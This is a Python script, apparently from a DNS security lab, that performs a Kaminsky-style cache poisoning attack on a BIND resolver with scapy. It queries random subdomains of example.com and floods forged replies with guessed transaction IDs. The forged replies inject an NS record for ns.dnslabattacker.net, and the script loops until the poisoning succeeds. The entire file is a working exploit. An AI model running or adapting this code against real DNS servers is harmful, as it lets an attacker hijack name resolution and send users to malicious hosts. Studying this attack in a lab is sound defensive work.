#!/usr/bin/env python2
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
# parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=True)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port 
# BIND's port
# dns_port = args.dns_port 
# port that your bind uses to send its DNS queries
my_query_port = args.query_port 

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
 
    while True:
        subDomain = getRandomSubDomain() + '.' + 'example.com'
        sock1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dnsPacket = DNS(rd=1, qd=DNSQR(qname=subDomain))
        sendPacket(sock1, dnsPacket, my_ip, my_port) # send query to BIND with an unique subDomain query such that BIND will send out query and listen to reply from outside

        data=None
        dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        spoof_reply = DNS(aa=1,rd=1, ra=1, qr=1, qdcount=1, 
                        ancount=1, 
                        nscount=1, 
                        arcount=0,
                        qd=DNSQR(qname=subDomain),
                        an=DNSRR(rrname=subDomain, ttl=3600, type='A', rdata ='1.2.3.4'),
                        ns=DNSRR(rrname='example.com', ttl=3600, type='NS', rdata='ns.dnslabattacker.net')) 
        for _ in range(256): # try lots of query id in short time, use while logis is inefficient
            spoof_reply.id = getRandomTXID()
            sendPacket(dns_sock, spoof_reply, my_ip, my_query_port) # flood the BIND with reply data (pretend to response the query that BIND sends out)

        data, (addr, port) = sock1.recvfrom(4096) # check the reply data that BIND send to dig to see if BIND cache our fake reply
        if data != None:
            res = DNS(data)
            if res[DNS].ns and res[DNS].ns.rdata=='ns.dnslabattacker.net.':
                # print(res[DNS].ns.rdata)
                print('Successfully Spoof DNS')
                res.show()
                break
            else:
                print('Spoof DNS Failed, we will try another subdomain')
                # res.show()


if __name__ == '__main__':
    exampleSendDNSQuery()
